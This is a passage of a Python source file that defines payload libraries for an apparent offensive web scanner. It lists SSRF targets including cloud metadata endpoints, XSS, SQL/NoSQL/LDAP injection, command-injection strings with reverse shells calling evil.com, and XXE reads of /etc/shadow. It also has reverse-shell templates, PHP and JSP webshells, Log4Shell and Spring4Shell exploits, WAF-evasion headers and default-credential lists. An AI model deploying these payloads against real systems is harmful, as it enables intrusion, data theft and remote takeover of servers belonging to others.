    "http://172.16.0.1/", "http://192.168.1.1/",
    "http://127.0.0.1:22/", "http://127.0.0.1:3306/",
    "http://127.0.0.1:6379/", "http://127.0.0.1:27017/",
    "http://127.0.0.1:5432/", "http://127.0.0.1:8080/",
    "http://127.0.0.1:9200/", "http://127.0.0.1:2375/",
    "file:///etc/passwd", "file:///etc/hosts",
    "gopher://localhost:25/",
    "dict://localhost:11211/stat",
    "ftp://localhost/",
    "http://127.0.0.1:8500/", "http://127.0.0.1:4001/",
    "http://127.0.0.1:2181/", "http://127.0.0.1:9092/",
    "http://0177.1/", "http://2130706433/",
    "http://0x7f000001/", "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    "http://localhost:80/admin", "http://127.0.0.1/admin",
    "http://127.0.0.1/api/v1/admin",
    "http://169.254.169.254/", "http://169.254.169.254/latest/",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<img src=\"x\" onerror=\"alert('xss')\">",
    "'\"><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "<<script>alert('XSS');//<</script>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "<svg><script>alert('xss')</script></svg>",
    "<input onfocus=alert(1) autofocus>",
    "<video src=_ onloadstart=alert(1)>",
    "data:text/html,<script>alert(1)</script>",
    "<math><mtext></table></math><img//onerror=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<template><script>alert(1)</script></template>",
    "\"><h1><img src=x onerror=alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<form><button formaction=javascript:alert(1)>click</button></form>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//';",
    "\";alert(String.fromCharCode(88,83,83))//\";",
    "</script><script>alert(1)</script>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<img/onerror=alert(1) src=x>",
    "<svg/onload=alert(1)>",
    "';alert(1)//",
    "\";alert(1)//",
    "`onmouseover=alert(1)`",
    "<ruby oncopy=alert(1)>text</ruby>",
    "<xmp><script>alert(1)</script></xmp>",
    "<!--><script>alert(1)</script>-->",
    "<![CDATA[<script>alert(1)</script>]]>",
]

CMD_INJECTION_PAYLOADS = [
    "; id", "| id", "|| id", "& id", "&& id",
    "; cat /etc/passwd", "| cat /etc/passwd",
    "|| cat /etc/passwd", "; whoami", "| whoami",
    "|| whoami", "`id`", "$(id)", "; ls -la",
    "| ls -la", "; uname -a", "| uname -a",
    "; sleep 5", "| sleep 5", "&& sleep 5",
    "\n/bin/id\n", "\r\n/bin/id",
    "`sleep 5`", "$(sleep 5)",
    "; curl http://evil.com/",
    "; wget http://evil.com/",
    "; ping -c 3 evil.com",
    "; nc -e /bin/sh evil.com 4444",
    "1; cat /etc/passwd", "1 | cat /etc/passwd",
    "'; ls -la", "\" && ls -la",
    ") id", ") && id", ") || id",
    "; env", "| env", "; printenv",
    "; cat /proc/version", "| cat /proc/version",
    "; ifconfig", "| ifconfig", "; ip addr",
    "; ps aux", "| ps aux",
    "; find / -name '*.conf' 2>/dev/null",
    "$(cat /etc/passwd)", "`cat /etc/passwd`",
    "\n\ncat /etc/passwd", "\n\nid\n\n",
    "; base64 /etc/passwd", "| base64 /etc/passwd",
    "; python3 -c \"import os;os.system('id')\"",
    "; perl -e 'system(\"id\")'",
    "; ruby -e 'exec \"id\"'",
    "| python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><test/>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:\\\\windows\\\\win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>',
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>',
]

NOSQL_PAYLOADS = [
    '{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}',
    '{"$regex": ".*"}', '{"$nin": [""]}',
    '{"$exists": true}', '{"$gt": -1}',
    '{"password": {"$ne": ""}}',
    '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
    '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"username": "admin", "password": {"$regex": ".*"}}',
    'username[$ne]=notadmin&password[$ne]=notpassword',
    'username=admin&password[$gt]=',
    '{"$where": "function(){return true}"}',
    '{"$where": "sleep(5000)"}',
    '{"username": {"$regex": "^a"}, "password": {"$exists": true}}',
]

OPEN_REDIRECT_PAYLOADS = [
    "http://evil.com", "https://evil.com",
    "//evil.com", "///evil.com",
    "javascript:alert(1)",
    "http://evil.com%2F",
    "http://evil.com@target.com",
    "//evil.com@target.com",
    "/\\evil.com", "\\\\evil.com",
    "http://evil.com?target.com",
    "http://target.com.evil.com",
    "http://evil.com#target.com",
    "%2Fevil.com", "%2F%2Fevil.com",
    "http://evil.com%00",
    "https:evil.com", "//evil%2Ecom",
    "http://evil。com", "http://evil．com",
    "http://evil%E3%80%82com",
    "\x01//evil.com",
    "/%09/evil.com", "/%0a/evil.com",
]

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:injected=value",
    "%0aSet-Cookie:injected=value",
    "%0d%0aContent-Length:0%0d%0a%0d%0a",
    "%0d%0aLocation:http://evil.com",
    "\r\nSet-Cookie:injected=value",
    "\nSet-Cookie:injected=value",
    "%E5%98%8D%E5%98%8ASet-Cookie:injected=value",
    "%0d%0a%0d%0aHTML_injection",
    "%u000d%u000aSet-Cookie:crlf=injection",
    "%0d%0aX-Injected-Header:injected",
    "%0d%0a%0d%0a<html><body>injected</body></html>",
]

SSTI_PAYLOADS = [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
    "{{7*'7'}}", "${{'a'.toUpperCase()}}",
    "{% for i in range(7) %}{{i}}{% endfor %}",
    "{{config}}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "${__import__('os').popen('id').read()}",
    "<%=`id`%>", "@{7*7}",
    "#set($x=7*7)${x}", "{{request.environ}}",
    "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{'id'|filter('system')}}",
    "${\"freemarker.template.utility.Execute\"?new()('id')}",
    "#include('/etc/passwd')",
]

SSTI_CONTEXTS = {
    "jinja2":      {"probe": "{{7*7}}", "confirm": "49"},
    "mako":        {"probe": "${7*7}", "confirm": "49"},
    "smarty":      {"probe": "{7*7}", "confirm": "49"},
    "freemarker":  {"probe": "${7*7}", "confirm": "49"},
    "twig":        {"probe": "{{7*7}}", "confirm": "49"},
    "erb":         {"probe": "<%= 7*7 %>", "confirm": "49"},
    "velocity":    {"probe": "#set($x=7*7)${x}", "confirm": "49"},
    "pebble":      {"probe": "{{7*7}}", "confirm": "49"},
    "tornado":     {"probe": "{{7*7}}", "confirm": "49"},
}

AUTH_BYPASS_PAYLOADS = [
    ("admin'--",               "anything"),
    ("admin'#",                "anything"),
    ("admin'/*",               "anything"),
    ("' OR '1'='1'--",         "' OR '1'='1'--"),
    ("' OR '1'='1'#",          "' OR '1'='1'#"),
    ("' OR 1=1--",             "' OR 1=1--"),
    ("' OR 1=1#",              "' OR 1=1#"),
    ("admin",                  "' OR '1'='1"),
    ("admin",                  "' OR '1'='1'--"),
    ("admin",                  "' OR '1'='1'#"),
    ("admin",                  "anything' OR 'x'='x"),
    ("\" OR \"\"=\"",          "\" OR \"\"=\""),
    ("\" OR 1=1--",            "\" OR 1=1--"),
    ("admin\"--",              "anything"),
    ("') OR ('1'='1",          "') OR ('1'='1"),
    ("')||'1'='1",             "anything"),
    ("' OR 'unusual'='unusual'--", "' OR 'unusual'='unusual'--"),
    ("0 OR 1=1",               "0 OR 1=1"),
    ("admin",                  "0 OR 1=1"),
    ("1234",                   "' OR '1'='1"),
    ("admin",                  "password"),
    ("administrator",          "administrator"),
    ("admin",                  "admin"),
    ("admin",                  "password"),
    ("admin",                  "123456"),
    ("admin",                  "admin123"),
    ("admin",                  "password123"),
    ("admin",                  "passw0rd"),
    ("admin",                  "letmein"),
    ("admin",                  "welcome"),
    ("admin",                  "qwerty"),
    ("admin",                  "monkey"),
    ("admin",                  "dragon"),
    ("admin",                  "master"),
    ("admin",                  "login"),
    ("admin",                  "12345"),
    ("admin",                  "1234567890"),
    ("admin",                  "superman"),
    ("admin",                  "batman"),
    ("admin",                  "trustno1"),
    ("admin",                  "iloveyou"),
    ("root",                   "root"),
    ("root",                   "toor"),
    ("root",                   "password"),
    ("root",                   ""),
    ("test",                   "test"),
    ("guest",                  "guest"),
    ("user",                   "user"),
    ("admin",                  "admin@123"),
    ("admin",                  "Admin@123"),
    ("admin",                  "P@ssw0rd"),
    ("admin",                  "qwerty123"),
    ("admin",                  "1qaz2wsx"),
    ("admin",                  "abc@123"),
    ("admin",                  "pass@123"),
    ("admin",                  "admin2024"),
    ("admin",                  "admin2023"),
    ("admin",                  "test123"),
    ("administrator",          "password"),
    ("administrator",          "admin"),
    ("administrator",          "123456"),
    ("webmaster",              "webmaster"),
    ("webmaster",              "password"),
    ("manager",                "manager"),
    ("manager",                "password"),
    ("support",                "support"),
    ("support",                "password"),
    ("info",                   "info"),
    ("demo",                   "demo"),
    ("demo",                   "password"),
    ("operator",               "operator"),
    ("sa",                     "sa"),
    ("sa",                     ""),
    ("sa",                     "password"),
    ("system",                 "manager"),
    ("system",                 "oracle"),
    ("sysdba",                 "change_on_install"),
]

COMMON_PASSWORDS = [
    "123456","password","123456789","12345678","12345",
    "1234567","1234567890","qwerty","abc123","111111",
    "123123","admin","letmein","monkey","master",
    "login","dragon","pass","password1","test",
    "iloveyou","princess","sunshine","shadow","superman",
    "michael","jessica","mustang","baseball","football",
    "batman","trustno1","welcome","hello","charlie",
    "donald","password123","passwd","secret","12341234",
    "1q2w3e4r","qwertyuiop","1234qwer","wordpress","wp",
    "admin123","nimda","root","toor","pass123",
    "changeme","P@ssw0rd","Admin@123","qwerty123","abc@123",
    "letmein!","pass@word1","1234Abcd","Abcd1234","admin@123",
    "password!","Password1","Passw0rd","p@$$w0rd","p@ssword",
    "0987654321","1q2w3e","zxcvbnm","asdfghjkl","poiuytrewq",
    "1qaz2wsx","3edc4rfv","password2","pass1234","123321",
    "1111111","2222222","3333333","4444444","5555555",
    "6666666","7777777","8888888","9999999","0000000",
    "password01","pass01","admin01","test01","user123",
    "root123","secret123","hello123","welcome1","hunter2",
    "696969","bigdaddy","blahblah","winter","spring",
    "summer","autumn","winter2024","spring2024",
    "company","company123","company@123","company2024",
    "qwerty12","qwerty1234","qwerty12345","keyboard",
    "12qwaszx","1qa2ws3ed","1qaz@WSX","!QAZ2wsx",
    "abc12345","abcd1234","abcdef","abcde12345",
    "111222333","112233","1122334455","1123581321",
    "ninja","letme1n","m@nager","@dmin","@dm1n",
    "p455w0rd","p@5sw0rd","pa$$w0rd","pa$$word",
    "magicword","abracadabra","sesame","opensesame",
    "correct horse battery staple","hackme","hacker",
    "test@123","admin#123","admin!@#","!@#$%^&*()",
    "a1b2c3d4","a1b2c3","abc123!","pass!word",
    "root@toor","toor@root","system","admin@2024",
]

                                                                                 
                                                  
                                                                                 

DESERIALIZATION_PAYLOADS = [
    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcH",
    'O:8:"stdClass":0:{}',
    'a:1:{i:0;O:7:"Message":1:{s:4:"data";s:2:"id";}}',
    "YToxOntzOjQ6Im1vcmUiO3M6Mjoial4iO30=",
    "TzoxNDoiZXZhbERlbW8iOjE6e3M6MToiYSI7czoyOiJpZCI7fQ==",
    "gzip|H4sIAAAAAAAAA6tWKkktLlGyUlIqS",
    'O:17:"PHPObjectInjection":1:{s:6:"inject";s:58:"system(\'id\');";}',
    "rO0ABXNyAC5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVy",
    "ACED0005737200", "yv66vg==",
]

REVSHELL_TEMPLATES = {
    "bash":
        "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "python3":
        "python3 -c 'import os,pty,socket;s=socket.socket();"
        "s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) "
        "for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'",
    "nc":
        "nc -e /bin/sh {lhost} {lport}",
    "ncat":
        "ncat {lhost} {lport} -e /bin/bash",
    "perl":
        "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        "exec(\"/bin/sh -i\");};'",
    "php":
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "ruby":
        "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
        "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "socat":
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
    "powershell":
        "powershell -NoP -NonI -W Hidden -Exec Bypass "
        "-Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});",
    "awk":
        "awk 'BEGIN{s=\"/inet/tcp/0/{lhost}/{lport}\";while(42){"
        "do{printf \"shell>\" |& s;s |& getline c;if(c){"
        "while((c |& getline) > 0) print $0 |& s;close(c);}}"
        "while(c != \"exit\")}}' /dev/stdin",
}

SHELL_PAYLOADS = [
    b"<?php system($_GET[0]);?>",
    b"<?php passthru($_REQUEST[1]);?>",
    b"<?php echo shell_exec($_POST[2]);?>",
    b"<?php @eval($_POST[3]);?>",
    b"<?php $f='sy'.'st'.'em';$f($_GET['cmd']);?>",
    b"<?php preg_replace('/.*/e',$_POST['c'],'x');?>",
    b"<?php if(isset($_REQUEST['c'])){echo '<pre>';"
    b"$op=shell_exec($_REQUEST['c'].' 2>&1');"
    b"echo htmlspecialchars($op);echo '</pre>';}?>",
    b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
    b"<script>java.lang.Runtime.getRuntime().exec(request.getParameter('cmd'))</script>",
    b"<?php if(md5($_GET['pass'])=='5f4dcc3b5aa765d61d8327deb882cf99'){system($_GET['cmd']);}?>",
    b"<?php move_uploaded_file($_FILES['f']['tmp_name'],"
    b"'/var/www/html/'.basename($_FILES['f']['name']));?>",
]

UPLOAD_EXTENSIONS_BYPASS = [
    ".php", ".php3", ".php4", ".php5", ".php7", ".phtml",
    ".pht", ".phps", ".php.jpg", ".php%00.jpg",
    ".php\x00.jpg", ".PHP", ".Php",
    ".asp", ".aspx", ".cer", ".asa", ".asax",
    ".ashx", ".asmx",
    ".jsp", ".jspx", ".jsw", ".jsv", ".jspf",
    ".cfm", ".cfc",
    ".pl", ".py", ".rb", ".sh", ".bash",
    ".svg", ".swf", ".htm", ".html",
    ".shtml", ".shtm",
    ".php.png", ".php.gif", ".php.jpeg",
    ".php%20", ".php.", ".php...",
    ".php;jpg", ".php%3bpng",
]

JWT_ALG_NONE_VARIANTS = [
    "none", "None", "NONE", "nOnE", "NoNe",
    "nOne", "nONe", "NONe",
]

HOST_HEADER_PAYLOADS = [
    "evil.com", "localhost", "127.0.0.1", "169.254.169.254",
    "internal.target.com", "admin.target.com",
    "target.com.evil.com", "target.com@evil.com",
    "evil.com:80", "evil.com:443",
    "evil.com#target.com", "evil.com?target.com",
    "target.com\r\nX-Injected: header",
    "target.com%0d%0aX-Injected: header",
    "\tevil.com",
]

HTTP_SMUGGLING_HEADERS = [
    ("Transfer-Encoding", "chunked"),
    ("Transfer-Encoding", " chunked"),
    ("Transfer-Encoding", "chunked "),
    ("Transfer-Encoding", "xchunked"),
    ("Transfer-Encoding", "x-chunked"),
    ("Transfer-Encoding", "\tchunked"),
    ("Transfer-Encoding", "chunked\r\n"),
]

CACHE_POISON_HEADERS = [
    "X-Forwarded-Host", "X-Forwarded-Scheme",
    "X-Forwarded-Proto", "X-Host",
    "X-Original-URL", "X-Rewrite-URL",
    "X-Forwarded-For", "X-Real-IP",
    "X-Forwarded-Server", "X-HTTP-Host-Override",
    "Forwarded", "X-Forwarded-Port",
    "True-Client-IP", "CF-Connecting-IP",
]

CORS_ORIGINS_TEST = [
    "https://evil.com", "https://attacker.com",
    "null", "https://target.com.evil.com",
    "https://evil.target.com", "http://evil.com",
    "https://eviltarget.com",
    "https://notevil.com",
    "file://",
]

PROTOTYPE_POLLUTION_PAYLOADS = [
    "__proto__[admin]=true",
    "__proto__[isAdmin]=true",
    "__proto__[role]=admin",
    "__proto__[user]=admin",
    "constructor[prototype][admin]=true",
    "constructor.prototype.admin=true",
    "__proto__[__proto__][admin]=1",
    "[__proto__][admin]=1",
    "a[__proto__]=1&a.__proto__.admin=1",
]

GRAPHQL_PAYLOADS = {
    "introspection": """{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      kind
      name
      fields {
        name
        args { name type { kind name } }
        type { kind name }
      }
    }
  }
}""",
    "get_users": "{ users { id username email password } }",
    "get_all": "{ __typename }",
    "mutation_register": """mutation {
  register(username: "admin", password: "admin", email: "admin@evil.com") {
    token user { id role }
  }
}""",
    "depth_attack": "{ a { a { a { a { a { a { a { a { a { a { __typename } } } } } } } } } } }",
    "batch": '[{"query":"{ __typename }"},{"query":"{ __typename }"}]',
    "alias_overload": "{ q1: users { id } q2: users { id } q3: users { id } q4: users { id } }",
}

LDAP_INJECTION_PAYLOADS = [
    "*", "*)(&", "*))%00", "*()|%26'",
    "*()|&'", "*)(uid=*)(|(uid=*",
    "admin)(&(password=*",
    "*))(|(cn=*",
    "*))%00bypass",
    "admin)(|(password=*",
    "*))(|(objectclass=*",
    "*\x00", "*(cn=*",
]

XPATH_INJECTION_PAYLOADS = [
    "' or '1'='1",
    "' or 1=1 or ''='",
    "x' or name()='username' or 'x'='y",
    "' or substring(name(),1,5)='admin",
    "') or ('1'='1",
    "' or count(/*)>0 or '1'='0",
    "x' or position()=1 or 'x'='y",
    "' or //user[1]/username='admin",
]

RACE_CONDITION_ENDPOINTS = [
    "/api/v1/transfer", "/api/v1/redeem", "/api/v1/apply",
    "/api/v1/use-voucher", "/checkout", "/payment",
    "/api/coupon/apply", "/api/wallet/transfer",
    "/wp-admin/admin-ajax.php", "/api/v1/vote",
    "/api/v1/claim", "/api/points/redeem",
]

S3_BUCKET_PATTERNS = [
    "{target}", "{target}-backup", "{target}-assets",
    "{target}-static", "{target}-media", "{target}-files",
    "{target}-uploads", "{target}-data", "{target}-logs",
    "{target}-dev", "{target}-staging", "{target}-prod",
    "{target}-public", "{target}-private",
    "{target}-images", "{target}-docs",
    "dev-{target}", "staging-{target}", "prod-{target}",
    "backup-{target}", "assets-{target}", "media-{target}",
]

LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://evil.com/a}",
    "${jndi:ldaps://evil.com/a}",
    "${jndi:rmi://evil.com/a}",
    "${jndi:dns://evil.com/a}",
    "${${lower:j}ndi:ldap://evil.com/a}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}",
    "${${lower:${lower:jndi}}:ldap://evil.com/a}",
    "${j${::-n}di:ldap://evil.com/a}",
    "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//evil.com/a}",
    "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D",
    "${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}",
    "${${upper:j}ndi:ldap://evil.com/a}",
]

SPRING4SHELL_PAYLOADS = [
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B",
    "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
    "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
    "class.module.classLoader.resources.context.parent.pipeline.first.prefix=syke_shell",
    "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
]

SHELLSHOCK_PAYLOADS = [
    "() { :;}; /usr/bin/id",
    "() { :;}; /bin/bash -c 'id'",
    "() { :;}; echo vulnerable",
    "() { :;}; sleep 5",
    "() { :;}; /bin/bash -c 'cat /etc/passwd'",
    "() { ignored; }; echo Content-type: text/plain ; echo ; echo vulnerable",
]

IIS_TILDE_PATHS = [
    "/~1/", "/~2/", "/~3/",
    "/*~1*/", "/*~1*/index.asp", "/*~1*/login.asp",
    "a.aspx*~1*", "a.asp*~1*",
    "*/~1*", "a%255c*~1*",
]

NGINX_ALIAS_TRAVERSAL = [
    "/static../etc/passwd",
    "/static../etc/shadow",
    "/static../proc/self/environ",
    "/images../etc/passwd",
    "/assets../etc/passwd",
    "/files../etc/passwd",
    "/media../etc/passwd",
    "/upload../etc/passwd",
]

WAF_SIGNATURES = {
    "cloudflare":    ["cloudflare","__cfduid","cf-ray","cf-cache-status"],
    "imperva":       ["incapsula","incap_ses","visid_incap","x-iinfo"],
    "sucuri":        ["sucuri","cloudproxy","x-sucuri-id","x-sucuri-cache"],
    "akamai":        ["akamai","x-akamai","akamaighost","akamaibot"],
    "wordfence":     ["wordfence","wf-block","blocked by wordfence"],
    "modsecurity":   ["mod_security","modsecurity","406 not acceptable","forbidden by rule"],
    "aws_waf":       ["x-amzn-requestid","awswaf"],
    "azure_waf":     ["x-ms-request-id","application gateway"],
    "f5_bigip":      ["f5","bigip","ts=","x-waf-event-info"],
    "barracuda":     ["barracuda","barra_counter_session"],
    "fortiweb":      ["fortigate","fortiweb"],
    "radware":       ["x-sl-compstate","rdwr"],
    "comodo":        ["protected by comodo"],
    "sitelock":      ["sitelock"],
    "dotdefender":   ["application defender","dotdefender"],
    "wallarm":       ["wallarm","x-wallarm"],
    "naxsi":         ["naxsi","libinjection"],
    "reblaze":       ["reblaze"],
}

WAF_EVASION_HEADERS = [
    {"X-Forwarded-For":            "127.0.0.1"},
    {"X-Originating-IP":           "127.0.0.1"},
    {"X-Remote-IP":                "127.0.0.1"},
    {"X-Client-IP":                "127.0.0.1"},
    {"X-Host":                     "127.0.0.1"},
    {"X-Custom-IP-Authorization":  "127.0.0.1"},
    {"X-Rewrite-URL":              "/wp-admin/"},
    {"X-Original-URL":             "/wp-admin/"},
    {"Referer":                    "https://127.0.0.1/wp-admin/"},
    {"X-HTTP-Method-Override":     "GET"},
    {"Content-Type":               "application/json; charset=utf-7"},
]

SUBDOMAIN_WORDLIST = [
    "www","mail","ftp","localhost","webmail","smtp","pop","ns1","ns2",
    "vpn","m","remote","blog","server","exchange","mail2","ns3","forum",
    "api","dev","staging","test","admin","shop","store","app","portal",
    "cdn","static","assets","images","img","media","docs","help","support",
    "status","monitor","analytics","search","cloud","beta","secure","ssl",
    "vpn2","remote2","backup","archive","old","new","legacy","internal",
    "corp","intranet","extranet","wiki","news","events","careers","jobs",
    "git","gitlab","jenkins","jira","confluence","prometheus","grafana",
    "kibana","elasticsearch","redis","mongo","db","database","mysql",
    "postgres","oracle","mssql","solr","memcache","rabbitmq","kafka",
    "dashboard","panel","control","cpanel","whm","plesk","directadmin",
    "staging2","dev2","qa","uat","sit","prod","production","sandbox",
    "preview","demo","uat2","qa2","test2","test3","testing","pre",
    "preprod","pre-prod","pre-production","alpha","beta2","gamma",
    "hub","central","node","cluster","k8s","kubernetes","docker",
    "registry","harbor","nexus","sonar","sonarqube","artifactory",
    "ci","cd","build","deploy","release","ops","devops","sre",
    "grafana2","alertmanager","pagerduty","datadog","newrelic",
    "logstash","fluentd","beats","filebeat","metricbeat",
    "auth","login","sso","oauth","identity","idp","iam",
    "pay","payment","checkout","billing","invoice","account",
    "customer","client","partner","vendor","supplier",
    "ir","investor","sec","legal","privacy","gdpr","compliance",
    "eng","engineering","tech","it","helpdesk","tickets","service",
    "mail3","mailhub","relay","gateway","outbound","inbound","smtp2",
    "smtp3","pop3","imap","imap2","autodiscover","autoconfig",
    "mx","mx1","mx2","email","webmail2","owa","exchange2",
    "download","downloads","upload","uploads","files","file",
    "data","datasets","reports","reporting","bi","warehouse",
    "mobile","wap","pwa","ios","android","native",
    "video","stream","media2","live","streaming","vod",
    "game","gaming","play","arcade",
    "health","status2","uptime","availability","ping",
    "proxy","firewall","loadbalancer","lb","waf",
    "vpn3","vpn4","vpn5","ngrok","tunnel",
    "sandbox2","sandbox3","stg","stg2","stg3",
    "feature","hotfix","bugfix","release2","canary",
]

TAKEOVER_FINGERPRINTS = {
    "github.io":             "There isn't a GitHub Pages site here",
    "herokuapp.com":         "No such app",
    "s3.amazonaws.com":      "NoSuchBucket",
    "azurewebsites.net":     "404 Web Site not found",
    "cloudapp.net":          "no-ip",
    "fastly.net":            "Fastly error: unknown domain",
    "shopify.com":           "Sorry, this shop is currently unavailable",
    "cargo.site":            "If you're moving your domain away from Cargo",
    "tumblr.com":            "Whatever you were looking for doesn't currently exist",
    "ghost.io":              "The thing you were looking for is no longer here",
    "zendesk.com":           "Help Center Closed",
    "statuspage.io":         "You are being redirected",
    "surge.sh":              "project not found",
    "bitbucket.io":          "Repository not found",
    "readthedocs.io":        "unknown to Read the Docs",
    "pantheon.io":           "The gods are wise",
    "helpjuice.com":         "We could not find what you're looking for",
    "helpscoutdocs.com":     "No settings were found for this company",
    "fly.dev":               "404 - Not Found",
    "vercel.app":            "The deployment could not be found",
    "netlify.app":           "Not Found",
    "render.com":            "Page Not Found",
    "gitbook.io":            "gitbook.io",
    "webflow.io":            "the page you are looking for doesn't exist",
    "myshopify.com":         "Sorry, this shop is currently unavailable",
}

TECHNOLOGY_FINGERPRINTS = {
    "WordPress":   ["wp-content","wp-includes","wp-login","wordpress"],
    "Joomla":      ["joomla","option=com_","administrator/index.php"],
    "Drupal":      ["sites/all","drupal","drupal.js","drupal.min.js"],
    "Magento":     ["magento","mage/","skin/frontend","varien"],
    "PrestaShop":  ["prestashop","modules/","themes/default"],
    "OpenCart":    ["opencart","catalog/view","system/library"],
    "Laravel":     ["laravel","csrf_token","laravel_session"],
    "Django":      ["csrfmiddlewaretoken","django"],
    "Rails":       ["rails","authenticity_token","_rails"],
    "Express":     ["x-powered-by: express"],
    "React":       ["__reactfibr","__reactinternalinstance","reactroot"],
    "Angular":     ["ng-version","angular","_nghost"],
    "Vue":         ["__vue__","vue-router","v-app"],
    "jQuery":      ["jquery.min.js","jquery.js","jquery-"],
    "Bootstrap":   ["bootstrap.min.css","bootstrap.css","bootstrap.min.js"],
    "Apache":      ["apache","server: apache"],
    "Nginx":       ["nginx","server: nginx"],
    "IIS":         ["iis","x-powered-by: asp","x-aspnet-version"],
    "PHP":         ["x-powered-by: php","set-cookie: phpsessid"],
    "ASP.NET":     ["aspnet","x-aspnet-version","__viewstate"],
    "Node.js":     ["x-powered-by: express","node.js"],
    "Cloudflare":  ["cf-ray","__cfduid","cloudflare"],
    "Varnish":     ["x-varnish","via: varnish"],
    "CDN":         ["x-cache","x-fastly","x-amz-cf-id"],
    "Spring":      ["x-application-context","whitelabel error page","spring"],
    "Struts":      ["struts","apache struts"],
    "ColdFusion":  ["cfid","cftoken","adobe coldfusion"],
    "Tomcat":      ["apache tomcat","tomcat"],
    "WebLogic":    ["weblogic","bea systems"],
    "JBoss":       ["jboss","jbossas"],
    "Kubernetes":  ["kubernetes","k8s","kubectl"],
    "Docker":      ["docker","container","dockerfile"],
}

TECHNOLOGY_SIGS = TECHNOLOGY_FINGERPRINTS

SECRET_PATTERNS = [
    (re.compile(r'(?i)(api[_-]?key|apikey)\s*[=:]\s*["\']?([A-Za-z0-9\-_]{20,})'),   "API Key"),
    (re.compile(r'(?i)(secret[_-]?key|secret)\s*[=:]\s*["\']?([A-Za-z0-9\-_]{20,})'),"Secret Key"),
    (re.compile(r'(?i)(password|passwd|pwd)\s*[=:]\s*["\']?([^\s\'"]{6,})'),           "Password"),
    (re.compile(r'(?i)(access[_-]?token|auth[_-]?token|token)\s*[=:]\s*["\']?([A-Za-z0-9\-_.]{20,})'),"Token"),
